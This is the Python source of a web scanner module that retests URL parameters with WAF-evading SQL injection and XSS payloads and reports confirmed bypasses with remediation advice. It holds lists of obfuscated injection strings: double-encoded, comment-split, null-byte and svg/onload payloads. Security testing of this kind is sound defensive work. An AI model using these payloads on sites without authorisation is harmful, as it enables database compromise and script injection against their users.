"""
WAF Evasion & Bypass Techniques Module (v1.7.0)
Re-runs injection tests with encoded/obfuscated payloads to bypass WAFs.
Inspired by: Nikto evasion modes, SQLMap tamper scripts, HackTricks WAF bypass
"""
from __future__ import annotations
import re
from typing import List, Tuple
from urllib.parse import urlparse, parse_qs, urlencode
from webshield.core.models import Finding, Severity
from webshield.core.http import get_client

WAF_SIGNATURES = re.compile(
    r"cloudflare|__cfduid|cf-ray|aws.waf|awswaf|x-amzn-requestid|"
    r"mod_security|modsecurity|naxsi|barracuda|f5.big-ip|sucuri|"
    r"incapsula|imperva|akamai|x-check-cacheable|fortigate|"
    r"Access Denied.*firewall|blocked.*security|Request blocked",
    re.I,
)

SQL_PAYLOADS_EVASION: List[Tuple[str, str]] = [
    ("double_url_encode",   "1%2527%2520OR%25201%253D1--"),
    ("comment_injection",   "1' UN/**/ION SE/**/LECT 1,2,3--"),
    ("case_variation",      "1' uNiOn SeLeCt 1,2,3--"),
    ("null_byte",           "1'%00 OR '1'='1"),
    ("unicode_quote",       "1\u02bc OR \u02bc1\u02bc=\u02bc1"),
    ("hpp_sqli",            None),   # handled separately
    ("newline_bypass",      "1'%0aOR%0a'1'='1"),
    ("tab_bypass",          "1'%09OR%09'1'='1"),
]

XSS_PAYLOADS_EVASION: List[Tuple[str, str]] = [
    ("double_encode",       "%253Cscript%253Ealert(1)%253C/script%253E"),
    ("case_variation",      "<ScRiPt>alert(1)</sCrIpT>"),
    ("null_byte",           "<scr%00ipt>alert(1)</scr%00ipt>"),
    ("html_entity",         "&lt;script&gt;alert(1)&lt;/script&gt;"),
    ("js_event_encoded",    "<img src=x onerror=%61%6C%65%72%74%281%29>"),
    ("svg_bypass",          "<svg/onload=alert(1)>"),
    ("template_literal",    "<img src=`x` onerror=alert(1)>"),
]

SQL_ERROR_PATTERN = re.compile(
    r"sql syntax|mysql_fetch|ORA-\d+|pg_query|sqlite_|"
    r"syntax error.*sql|unclosed quotation|sqlstate",
    re.I,
)
XSS_REFLECT_PATTERN = re.compile(r"<script>alert\(1\)</script>|alert\(1\)", re.I)


def _detect_waf(resp_headers: dict, resp_body: str) -> bool:
    headers_str = str(resp_headers)
    return bool(WAF_SIGNATURES.search(headers_str + resp_body[:500]))


def _get_base_and_params(url: str):
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = parse_qs(parsed.query, keep_blank_values=True)
    return base, params


def scan(url: str, timeout: float = 10.0) -> List[Finding]:
    findings: List[Finding] = []
    base, params = _get_base_and_params(url)

    if not params:
        # No params — nothing to test evasion on
        return findings

    with get_client(timeout=min(timeout, 8.0)) as client:
        # Check if WAF is present
        try:
            r_baseline = client.get(url)
            waf_present = _detect_waf(dict(r_baseline.headers), r_baseline.text)
        except Exception:
            return findings

        # Test each param with evasion payloads
        for param_name, param_vals in list(params.items())[:3]:
            original_val = param_vals[0] if param_vals else "1"

            # ── SQLi evasion
            for (technique, payload) in SQL_PAYLOADS_EVASION:
                if payload is None:
                    # HPP: duplicate the param with SQLi
                    test_url = f"{base}?{param_name}={original_val}&{param_name}=1'+OR+'1'='1"
                else:
                    test_params = dict(params)
                    test_params[param_name] = [payload]
                    qs = "&".join(f"{k}={v[0]}" for k, v in test_params.items())
                    test_url = f"{base}?{qs}"

                try:
                    r = client.get(test_url)
                    body = r.text

                    # Did the WAF block it?
                    waf_blocked = _detect_waf(dict(r.headers), body)

                    if SQL_ERROR_PATTERN.search(body):
                        findings.append(Finding(
                            title=f"SQLi WAF Bypass ({technique}) — param: {param_name}",
                            severity=Severity.CRITICAL,
                            description=(
                                f"SQL injection was confirmed using WAF evasion technique '{technique}'. "
                                f"{'A WAF is present but was bypassed.' if waf_present else 'No WAF detected.'} "
                                f"The payload triggered a SQL error in the response, confirming injection."
                            ),
                            evidence=(
                                f"URL: {test_url}\n"
                                f"Technique: {technique}\n"
                                f"Payload: {payload or 'HPP duplicate'}\n"
                                f"WAF detected: {waf_present} | Blocked: {waf_blocked}\n"
                                f"SQL error in response: {SQL_ERROR_PATTERN.search(body).group(0)}"
                            ),
                            remediation=(
                                "Use parameterized queries / prepared statements. "
                                "WAF bypass shows that WAFs are not a substitute for proper input handling."
                            ),
                            code_fix=(
                                "# Parameterized query — cannot be bypassed:\n"
                                "cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n\n"
                                "# Never interpolate user input into SQL strings."
                            ),
                            reference="https://owasp.org/www-community/attacks/SQL_Injection",
                            module="evasion_scan",
                            cvss=9.8,
                        ))
                        break
                except Exception:
                    continue

            if findings:
                break

            # ── XSS evasion
            for (technique, payload) in XSS_PAYLOADS_EVASION:
                test_params = dict(params)
                test_params[param_name] = [payload]
                qs = "&".join(f"{k}={v[0]}" for k, v in test_params.items())
                test_url = f"{base}?{qs}"

                try:
                    r = client.get(test_url)
                    if payload.lower() in r.text.lower() or XSS_REFLECT_PATTERN.search(r.text):
                        findings.append(Finding(
                            title=f"XSS WAF Bypass ({technique}) — param: {param_name}",
                            severity=Severity.HIGH,
                            description=(
                                f"Reflected XSS was confirmed using WAF evasion technique '{technique}'. "
                                f"{'A WAF is present but was bypassed.' if waf_present else ''} "
                                "The XSS payload was reflected in the response unencoded."
                            ),
                            evidence=(
                                f"URL: {test_url}\n"
                                f"Technique: {technique}\n"
                                f"Payload reflected in response"
                            ),
                            remediation=(
                                "Output-encode all user input. Use a Content Security Policy. "
                                "Do not rely solely on WAF for XSS protection."
                            ),
                            code_fix=(
                                "# Python — always HTML-escape output:\n"
                                "from markupsafe import escape\n"
                                "safe_val = escape(user_input)\n\n"
                                "# React: use JSX (auto-escapes), never dangerouslySetInnerHTML"
                            ),
                            reference="https://owasp.org/www-community/attacks/xss/",
                            module="evasion_scan",
                            cvss=7.5,
                        ))
                        break
                except Exception:
                    continue

            if findings:
                break

        # ── Report WAF evasion opportunity if WAF found but no bypass yet
        if waf_present and not findings:
            findings.append(Finding(
                title="WAF Detected — Evasion Techniques Attempted (No Bypass Confirmed)",
                severity=Severity.INFO,
                description=(
                    "A Web Application Firewall (WAF) was detected. "
                    "WebShield attempted multiple evasion techniques (double-encoding, "
                    "comment injection, case variation, HPP, null bytes) but could not "
                    "confirm a successful bypass. The WAF appears to be blocking injection attempts."
                ),
                evidence=f"WAF signature detected in response headers/body for: {url}",
                remediation=(
                    "WAFs provide defense-in-depth but should not replace secure coding. "
                    "Ensure parameterized queries and output encoding are also in place."
                ),
                code_fix="",
                reference="https://owasp.org/www-community/controls/Web_Application_Firewall",
                module="evasion_scan",
                cvss=0.0,
            ))

    return findings
